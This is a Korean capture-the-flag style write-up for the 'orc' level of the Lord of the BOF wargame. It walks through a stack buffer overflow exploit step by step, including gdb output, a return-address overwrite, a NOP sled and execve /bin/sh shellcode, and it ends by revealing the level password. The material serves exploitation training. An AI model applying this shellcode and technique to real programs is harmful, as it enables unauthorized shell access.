# orc

```c
[goblin@localhost goblin]$ cat orc.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

환경 변수를 초기화는 코드가 삽입되어 있어서 지금까지의 방식을 사용할 수 없는 bof문제이다.

하지만 argv[1] [47]가 '\xbf'라면 argv[1]의 크기를 원하는 만큼 받을 수 있으므로 입력에다 쉘 코드를 입력하면 된다.

일단 이게 되는지 확인해보기 위해서 앞은 대충 채우고 마지막 4bytes만 '\xbf' 로 채워서 마지막 printf문이 실행되는지 체크한다. 

```bash
[goblin@localhost goblin]$ ./orc `python -c 'print "A"*44+"\xbf\xbf\xbb\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒
Segmentation fault
```

정상적으로 출력되는 것을 볼 수 있다. 

그렇다면, buffer로부터 쉘코드를 넣어주고 ret부분만 buffer의 시작점으로 주면 쉘을 딸 수 있겠다.

argv[1] [47]이 ret부분인데 아주 공교롭게도 gdb를 떠보면 주소의 시작부분이 전부 '\xbf'이니까 신경 쓸 필요없다. (일부러 이렇게 주고 헷갈리게 한건지 힌트를 준건지는 모르겠다.)

gdb를 열어서 nop을 200개 넣고 buffer의 주소를 찾아주면

```bash
(gdb) r `python -c 'print "\x90"*200'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/goblin/attackme `python -c 'print "\x90"*200'`

Breakpoint 1, 0x8048500 in main ()
(gdb) x/200x $esp
0xbffffa4c:     0x400309cb      0x00000002      0xbffffa94      0xbffffaa0
0xbffffa5c:     0x40013868      0x00000002      0x08048450      0x00000000
0xbffffa6c:     0x08048471      0x08048500      0x00000002      0xbffffa94
0xbffffa7c:     0x08048390      0x0804860c      0x4000ae60      0xbffffa8c
0xbffffa8c:     0x40013e90      0x00000002      0xbffffb94      0xbffffbaa
0xbffffa9c:     0x00000000      0xbffffc73      0xbffffc95      0xbffffc9f
0xbffffaac:     0xbffffcad      0xbffffccc      0xbffffcdb      0xbffffcf7
0xbffffabc:     0xbffffd13      0xbffffd32      0xbffffd3d      0xbffffd4b
0xbffffacc:     0xbffffd8d      0xbffffd9f      0xbffffdb4      0xbffffdc4
0xbffffadc:     0xbffffdd0      0xbffffdee      0xbffffdf9      0xbffffe0a
0xbffffaec:     0xbffffe1b      0xbffffe23      0x00000000      0x00000003
0xbffffafc:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffb0c:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffb1c:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffb2c:     0x08048450      0x0000000b      0x000001f7      0x0000000c
0xbffffb3c:     0x000001f7      0x0000000d      0x000001f7      0x0000000e
0xbffffb4c:     0x000001f7      0x00000010      0x0fabfbff      0x0000000f
0xbffffb5c:     0xbffffb8f      0x00000000      0x00000000      0x00000000
0xbffffb6c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffb7c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffb8c:     0x69000000      0x00363836      0x6d6f682f      0x6f672f65
0xbffffb9c:     0x6e696c62      0x7474612f      0x6d6b6361      0x90900065
0xbffffbac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbbc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbcc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbdc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbfc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc0c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc1c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc2c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc3c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc4c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc5c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc6c:     0x90909090      0x4c009090      0x4f535345      0x3d4e4550
0xbffffc7c:     0x73752f7c      0x69622f72      0x656c2f6e      0x69707373
0xbffffc8c:     0x732e6570      0x73252068      0x45535500      0x4d414e52
0xbffffc9c:     0x48003d45      0x53545349      0x3d455a49      0x30303031
0xbffffcac:     0x534f4800      0x4d414e54      0x6f6c3d45      0x686c6163
0xbffffcbc:     0x2e74736f      0x61636f6c      0x6d6f646c      0x006e6961
0xbffffccc:     0x4e474f4c      0x3d454d41      0x6c626f67      0x52006e69
0xbffffcdc:     0x544f4d45      0x534f4845      0x39313d54      0x36312e32
0xbffffcec:     0x616e2e38      0x632e6574      0x4d006d6f      0x3d4c4941
0xbffffcfc:     0x7261762f      0x6f70732f      0x6d2f6c6f      0x2f6c6961
0xbffffd0c:     0x6c626f67      0x4d006e69      0x54484341      0x3d455059
0xbffffd1c:     0x36383369      0x6465722d      0x2d746168      0x756e696c
0xbffffd2c:     0x6e672d78      0x45540075      0x783d4d52      0x6d726574
0xbffffd3c:     0x534f4800      0x50595454      0x33693d45      0x50003638
0xbffffd4c:     0x3d485441      0x7273752f      0x636f6c2f      0x622f6c61
0xbffffd5c:     0x2f3a6e69      0x3a6e6962      0x7273752f      0x6e69622f
(gdb) q
```

0xbffffbac가 buffer의 시작점임을 알 수 있다. 

그럼 이제 ret부분만 buffer의 시작 주소를 넣어주고 나머지를 NOP으로 채운 뒤에 쉘코드를 넣어줘보자

```bash
[goblin@localhost goblin]$ ./orc `python -c 'print "\x90"*44+"\xac\xfb\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                                       ̀1▒̀
Segmentation fault
```

40bytes의 buffer에 4bytes의 sfp까지 총 44bytes의 NOP을 채우고 buffer의 시작주소를 넣어주고 NOP sled를 넣은다음 쉘코드를 넣어주었는데 제대로 실행되지 않았다... (왜지.. )

혹시 몰라 NOP sled를 10배로 늘려서 재실행해보았더니 깔끔하게 답이 나왔다.

```bash
[goblin@localhost goblin]$ ./orc `python -c 'print "\x90"*44+"\xac\xfb\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                                   ̀1▒̀
bash$ whoami
orc
bash$ my-pass
euid = 504
cantata
```

orc의 password는 cantata이다.